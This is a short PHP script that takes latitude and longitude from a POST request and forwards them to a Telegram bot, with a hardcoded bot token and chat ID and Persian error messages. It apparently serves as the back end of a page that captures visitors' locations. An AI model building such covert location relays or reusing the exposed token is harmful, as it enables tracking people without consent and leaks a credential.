<?php
$botToken = '8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs';
$chatId = '8438093859';

$input = json_decode(file_get_contents('php://input'), true);
$latitude = $input['latitude'] ?? null;
$longitude = $input['longitude'] ?? null;

if ($latitude && $longitude) {
    $message = "Latitude: $latitude, Longitude: $longitude";
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result) {
        http_response_code(200);
        echo json_encode(['success' => true]);
    } else {
        http_response_code(500);
        echo json_encode(['error' => 'ارسال ناموفق']);
    }
} else {
    http_response_code(400);
    echo json_encode(['error' => 'مختصات ناقص']);
}
?>
